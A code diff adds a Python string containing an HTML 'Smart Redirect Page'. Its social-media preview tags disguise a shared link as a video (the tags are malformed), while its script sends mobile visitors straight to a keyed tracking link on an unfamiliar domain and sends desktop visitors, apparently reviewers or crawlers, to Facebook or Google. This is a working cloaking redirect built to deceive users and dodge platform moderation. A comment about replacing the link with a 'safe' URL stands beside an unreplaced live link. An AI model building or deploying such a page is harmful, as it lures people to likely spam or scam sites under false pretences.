@@ -1,0 +1,47 @@
+html_content = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Smart Redirect Page</title>
+
+  <!-- Facebook preview info -->
+  <meta name="description" content="my_video-hd"-type="video/"/>
+  <meta property="og:title" content="my_video-hd"-type="video/"" />
+  <meta property="og:description" content="my_video-hd"-type="video/"/>
+  <meta property="og:image" content="https://linkzozo.web.app/ezy.svg" />
+  <meta name="twitter:card" content="summary_large_image" />
+</head>
+<body>
+  <script>
+    // ---- CONFIG ----
+    const CONFIG = {
+      // IMPORTANT: Replace the placeholder below with your own SAFE URL before hosting.
+      myLink: "https://fortunatelychastise.com/g62hhyg9?key=ae9445d7fd1cd3a95cdfe4d307e7e434", // <-- replace with your safe mobile URL
+      desktopTargets: [
+        "https://www.facebook.com",
+        "https://www.google.com",
+      ]
+    };
+    // ----------------
+
+    function isMobile() {
+      return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+    }
+
+    function pickRandom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    if (isMobile()) {
+      // Direct, immediate redirect for mobile
+      window.location.replace(CONFIG.myLink);
+    } else {
+      // Direct, immediate redirect for desktop to one of the targets
+      const target = pickRandom(CONFIG.desktopTargets);
+      window.location.replace(target);
+    }
+  </script>
+</body>
+</html>
+
